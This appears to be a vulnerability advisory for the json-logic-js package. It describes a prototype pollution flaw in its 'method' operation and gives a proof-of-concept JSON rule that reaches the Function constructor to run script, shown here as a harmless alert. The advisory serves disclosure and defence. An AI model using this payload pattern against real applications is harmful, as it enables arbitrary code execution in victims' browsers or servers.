# Overview

`json-logic-js` is a Build complex rules, serializes them as JSON and execute them in JavaScript.

This package is vulnerable to Prototype Pollution, the method operation allows a malicious user to modify the prototype of Object through the method property name. This causes modification of any existing property that will exist on all objects and leads to Remote Code Execution. The following rule creates a popup when run from a browser.

# Proof of Concept

```
{
  "method": [
    {
      "method": [
        {
          "var": "__proto__.constructor.is.__proto__"
        },
        "constructor",
        [
          "var x = 'SECURITY!'; console.log(x, window.fetch); alert(x)"
        ]
      ]
    },
    "call"
  ]
}
```

```
{ "method": [ { "method": [ { "var": "__proto__.constructor.is.__proto__" }, "constructor", [ "var x = 'SECURITY!'; console.log(x, window.fetch); alert(x)" ] ] }, "call" ] }
```
